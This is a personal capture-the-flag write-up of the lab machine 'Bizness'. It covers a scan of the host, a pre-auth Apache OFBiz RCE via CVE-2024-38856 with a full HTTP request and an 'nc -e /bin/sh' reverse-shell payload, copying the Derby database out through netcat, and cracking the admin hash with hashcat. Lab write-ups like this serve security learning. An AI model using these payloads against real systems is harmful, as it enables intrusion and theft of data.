---
title: Bizness
draft: false
tags:
  - linux
  - medium
aliases:
---
# Describe
Bizness is an easy Linux machine showcasing an Apache OFBiz pre-authentication, remote code execution (RCE) foothold, classified as `[CVE-2023-49070](https://nvd.nist.gov/vuln/detail/CVE-2023-49070)`. The exploit is leveraged to obtain a shell on the box, where enumeration of the OFBiz configuration reveals a hashed password in the service&#039;s Derby database. Through research and little code review, the hash is transformed into a more common format that can be cracked by industry-standard tools. The obtained password is used to log into the box as the root user.
# Detect
- nmap: 
	- 4 port: 
```
Starting Nmap 7.92 ( https://nmap.org ) at 2024-10-23 11:33 EDT
Nmap scan report for 10.129.1.16 (10.129.1.16)
Host is up (0.087s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp    open  http       nginx 1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
|_http-server-header: nginx/1.18.0
443/tcp   open  ssl/http   nginx 1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Not valid before: 2023-12-14T20:03:40
|_Not valid after:  2328-11-10T20:03:40
| tls-nextprotoneg: 
|_  http/1.1
| tls-alpn: 
|_  http/1.1
|_http-server-header: nginx/1.18.0
|_ssl-date: TLS randomness does not represent time
36119/tcp open  tcpwrapped
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=10/23%OT=22%CT=1%CU=37778%PV=Y%DS=2%DC=T%G=Y%TM=671917
OS:71%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M537ST11NW7%O2=M537ST11NW7%O3=M537NNT11NW7%O4=M537ST11NW7%O5=M537ST
OS:11NW7%O6=M537ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC
OS:N(R=Y%DF=Y%T=40%W=FAF0%O=M537NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT       ADDRESS
1   127.02 ms 10.10.16.1 (10.10.16.1)
2   37.60 ms  10.129.1.16 (10.129.1.16)
```
- detect technology: nginx 1.18.0, `Apache OFBiz` , /rest/api/version
- dirsearch : https://bizness.htb/control/, https://bizness.htb/control/login
![[Pasted image 20250109224819.png]]-> we known version of Apache OFBiz: 18.12
- Now we will search `Apache OFBiz 18.12 CVE` ![[Pasted image 20250109224841.png]]
- WOW !!! so many CVE . I will prioritize CVEs best impact and Unauthencation: #CVE-2024-38856, #CVE-2023-49070,  #CVE-2023-51467
# Exploit
### CVE-2024-38856
https://www.zscaler.com/blogs/security-research/cve-2024-38856-pre-auth-rce-vulnerability-apache-ofbiz
https://github.com/securelayer7/CVE-2024-38856_Scanner
Now i will try this CVE. The CVE unauthenticated access was permitted to the ProgramExport endpoint, potentially enabling the execution of arbitrary code. 
How to detect: 
`POST /webtools/control/forgotPassword/;%2e%2e/ProgramExport
`POST-Body: groovyProgram=throw new Exception('whoami'.execute().text);`
![[Pasted image 20250109224919.png]]Cool. Now i will discovery with some command : 
- pwd: /opt/ofbiz
- ls -al : 
- whoami: Not executed for security reason (it seems not permission)
- id: uid=1001(ofbiz) gid=1001(ofbiz-operator) groups=1001(ofbiz-operator)
-> Now i will get fist flag in folder ofbiz: 
Reverse shell basic:
```
POST /webtools/control/forgotPassword/;%2e%2e/ProgramExport HTTP/1.1

Host: bizness.htb

Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="96"

Sec-Ch-Ua-Mobile: ?0

Sec-Ch-Ua-Platform: "Linux"

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

Sec-Fetch-Site: none

Sec-Fetch-Mode: navigate

Sec-Fetch-User: ?1

Sec-Fetch-Dest: document

Accept-Encoding: gzip, deflate

Accept-Language: en-US,en;q=0.9

Connection: close

Content-Type: application/x-www-form-urlencoded

Content-Length: 82



groovyProgram=throw new Exception('nc -e /bin/sh 10.10.16.7 9998'.execute().text);

nc -e /bin/sh 10.10.16.7 9998
nc -lnvp 9998
```
![[Pasted image 20250109224950.png]]![[Pasted image 20250109225005.png]]
get flag :)) 
==Note: when using command cd then redirect to owner's home directory==
![[Pasted image 20250109225030.png]]
# Privileges escalation
- I will discovery all file build of server in /opt/ofbiz such as dockerfile, build
	- Docker file: 
```
# syntax=docker/dockerfile:1
#####################################################################
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# "License"); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.
#####################################################################

FROM eclipse-temurin:8 AS builder

# Git is used for various OFBiz build tasks.
RUN apt-get update \
    && apt-get install -y --no-install-recommends git \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /builder

# Add and run the gradle wrapper to trigger a download if needed.
COPY --chmod=755 gradle/init-gradle-wrapper.sh gradle/
COPY --chmod=755 gradlew .
RUN ["sed", "-i", "s/shasum/sha1sum/g", "gradle/init-gradle-wrapper.sh"]
RUN ["gradle/init-gradle-wrapper.sh"]

# Run gradlew to trigger downloading of the gradle distribution (if needed)
RUN --mount=type=cache,id=gradle-cache,sharing=locked,target=/root/.gradle \
    ["./gradlew", "--console", "plain"]

# Copy all OFBiz sources.
COPY applications/ applications/
COPY config/ config/
COPY framework/ framework/
COPY gradle/ gradle/
COPY lib/ lib/
# We use a regex to match the plugins directory to avoid a build error when the directory doesn't exist.
COPY plugin[s]/ plugins/
COPY themes/ themes/
COPY APACHE2_HEADER build.gradle common.gradle gradle.properties NOTICE settings.gradle .

# Build OFBiz while mounting a gradle cache
RUN --mount=type=cache,id=gradle-cache,sharing=locked,target=/root/.gradle \
    --mount=type=tmpfs,target=runtime/tmp \
    ["./gradlew", "--console", "plain", "distTar"]

###################################################################################

FROM eclipse-temurin:8 AS runtimebase

# xsltproc is used to disable OFBiz components during first run.
RUN apt-get update \
    && apt-get install -y --no-install-recommends xsltproc \
    && rm -rf /var/lib/apt/lists/*

RUN ["useradd", "ofbiz"]

# Create directories used to mount volumes where hooks into the startup process can be placed.
RUN ["mkdir", "--parents", \
    "/docker-entrypoint-hooks/before-config-applied.d", \
    "/docker-entrypoint-hooks/after-config-applied.d", \
    "/docker-entrypoint-hooks/before-data-load.d", \
    "/docker-entrypoint-hooks/after-data-load.d", \
    "/docker-entrypoint-hooks/additional-data.d"]
RUN ["/usr/bin/chown", "-R", "ofbiz:ofbiz", "/docker-entrypoint-hooks" ]

USER ofbiz
WORKDIR /ofbiz

# Extract the OFBiz tar distribution created by the builder stage.
RUN --mount=type=bind,from=builder,source=/builder/build/distributions/ofbiz.tar,target=/mnt/ofbiz.tar \
    ["tar", "--extract", "--strip-components=1", "--file=/mnt/ofbiz.tar"]

# Create directories for OFBiz volume mountpoints.
RUN ["mkdir", "/ofbiz/runtime", "/ofbiz/config", "/ofbiz/lib-extra"]

# Append the java runtime version to the OFBiz VERSION file.
COPY --chmod=644 --chown=ofbiz:ofbiz VERSION .
RUN echo '${uiLabelMap.CommonJavaVersion}:' "$(java --version | grep Runtime | sed 's/.*Runtime Environment //; s/ (build.*//;')" >> /ofbiz/VERSION

# Leave executable scripts owned by root and non-writable, addressing sonarcloud rule,
# https://sonarcloud.io/organizations/apache/rules?open=docker%3AS6504&rule_key=docker%3AS6504
COPY --chmod=555 docker/docker-entrypoint.sh docker/send_ofbiz_stop_signal.sh .

COPY --chmod=444 docker/disable-component.xslt .
COPY --chmod=444 docker/templates templates

EXPOSE 8443
EXPOSE 8009
EXPOSE 5005

ENTRYPOINT ["/ofbiz/docker-entrypoint.sh"]
CMD ["bin/ofbiz"]

###################################################################################
# Load demo data before defining volumes. This results in a container image
# that is ready to go for demo purposes.
FROM runtimebase AS demo

USER ofbiz

RUN /ofbiz/bin/ofbiz --load-data
RUN mkdir --parents /ofbiz/runtime/container_state
RUN touch /ofbiz/runtime/container_state/data_loaded
RUN touch /ofbiz/runtime/container_state/admin_loaded
RUN touch /ofbiz/runtime/container_state/db_config_applied

VOLUME ["/docker-entrypoint-hooks"]
VOLUME ["/ofbiz/config", "/ofbiz/runtime", "/ofbiz/lib-extra"]


###################################################################################
# Runtime image with no data loaded.
FROM runtimebase AS runtime

USER ofbiz

VOLUME ["/docker-entrypoint-hooks"]
VOLUME ["/ofbiz/config", "/ofbiz/runtime", "/ofbiz/lib-extra"]
```
- Có được một vài thông tin. 
- Tìm cơ sở dữ liệu mà ứng dụng đang sử dụng. Sau khi tìm hiểu thì Ofbiz sử dụng Database default là  Apache Derby. Because I didn't find all port of  other database services.
==In fact:  _Apache Derby_ Embedded Database in default manner it doesn't _need_ authentication.==
- IDEA: We can read data of Derby very easy -> Now i will get Derby-related files in server.
```
find / -name "derby*"
/home/ofbiz/.gradle/caches/modules-2/files-2.1/org.apache.derby/derby-project
/home/ofbiz/.gradle/caches/modules-2/files-2.1/org.apache.derby/derby-project/10.14.2.0/7ddf9863d6f000b74740430327a57b4a19687291/derby-project-10.14.2.0.pom
/home/ofbiz/.gradle/caches/modules-2/files-2.1/org.apache.derby/derby
/home/ofbiz/.gradle/caches/modules-2/files-2.1/org.apache.derby/derby/10.14.2.0/9f81aed17f9d1fb885028eefac617e630fffb420/derby-10.14.2.0.pom
/home/ofbiz/.gradle/caches/modules-2/files-2.1/org.apache.derby/derby/10.14.2.0/7efad40ef52fbb1f08142f07a83b42d29e47d8ce/derby-10.14.2.0.jar
/home/ofbiz/.gradle/caches/modules-2/metadata-2.69/descriptors/org.apache.derby/derby-project
/home/ofbiz/.gradle/caches/modules-2/metadata-2.69/descriptors/org.apache.derby/derby
/opt/ofbiz/runtime/data/derby.properties
/opt/ofbiz/runtime/data/derby
/opt/ofbiz/runtime/data/derby/derby.log
```
-> Now I will know Derby-related file in `/opt/ofbiz/runtime/data/derby`
Now i will read derby.log
```
----------------------------------------------------------------
Thu Oct 24 10:17:25 EDT 2024:
Booting Derby version The Apache Software Foundation - Apache Derby - 10.14.2.0 - (1828579): instance 601a400f-0192-bee3-ae73-ffffa94ec81a 
on database directory /opt/ofbiz/runtime/data/derby/ofbiz with class loader jdk.internal.loader.ClassLoaders$AppClassLoader@55054057 
Loaded from file:/home/ofbiz/.gradle/caches/modules-2/files-2.1/org.apache.derby/derby/10.14.2.0/7efad40ef52fbb1f08142f07a83b42d29e47d8ce/derby-10.14.2.0.jar
java.vendor=Debian
java.runtime.version=11.0.22+7-post-Debian-1deb11u1
user.dir=/opt/ofbiz
os.name=Linux
os.arch=amd64
os.version=5.10.0-28-amd64
derby.system.home=runtime/data/derby
----------------------------------------------------------------
----------------------------------------------------------------
Thu Oct 24 10:17:25 EDT 2024:
Booting Derby version The Apache Software Foundation - Apache Derby - 10.14.2.0 - (1828579): instance a816c00e-0192-bee3-ae73-ffffa94ec81a 
on database directory /opt/ofbiz/runtime/data/derby/ofbizolap with class loader jdk.internal.loader.ClassLoaders$AppClassLoader@55054057 
Loaded from file:/home/ofbiz/.gradle/caches/modules-2/files-2.1/org.apache.derby/derby/10.14.2.0/7efad40ef52fbb1f08142f07a83b42d29e47d8ce/derby-10.14.2.0.jar
java.vendor=Debian
java.runtime.version=11.0.22+7-post-Debian-1deb11u1
user.dir=/opt/ofbiz
os.name=Linux
os.arch=amd64
os.version=5.10.0-28-amd64
derby.system.home=runtime/data/derby
Thu Oct 24 10:17:25 EDT 2024:
Booting Derby version The Apache Software Foundation - Apache Derby - 10.14.2.0 - (1828579): instance f81e0010-0192-bee3-ae73-ffffa94ec81a 
on database directory /opt/ofbiz/runtime/data/derby/ofbiztenant with class loader jdk.internal.loader.ClassLoaders$AppClassLoader@55054057 
Loaded from file:/home/ofbiz/.gradle/caches/modules-2/files-2.1/org.apache.derby/derby/10.14.2.0/7efad40ef52fbb1f08142f07a83b42d29e47d8ce/derby-10.14.2.0.jar
java.vendor=Debian
java.runtime.version=11.0.22+7-post-Debian-1deb11u1
user.dir=/opt/ofbiz
os.name=Linux
os.arch=amd64
os.version=5.10.0-28-amd64
derby.system.home=runtime/data/derby
Database Class Loader started - derby.database.classpath=''
Database Class Loader started - derby.database.classpath=''
Database Class Loader started - derby.database.classpath=''
```


- After i found Derby-relate file i will connect to read data by Derby-tools. But This hasn't Derby-tool on server -> I will down folder derby to my kali
```
victim
tar cvf /dev/shm/derby.tar derby
cat /dev/shm/derby.tar | nc 10.10.16.24

attcker
nc -lvnp 9001 >derby.tar
tar -xvf derby.tar
```
Down complete ![[Pasted image 20241027170244.png]] Now I will read data by Derby-tools
 I will connect with ofbiz by command : `connect 'jdbc:derby:./ofbiz'
 ![[Pasted image 20250109225333.png]]
 -> I will read data of USER_LOGIN table:
 -> account : `admin: $SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I`
- I used CyperChef to  convert to hex version of password
Now i will crack pass sha1 by hashcat: hashcat -a 0 -m 120 hash.txt /usr/share/wordlists/rockyou.txt
![[Pasted image 20250109225416.png]]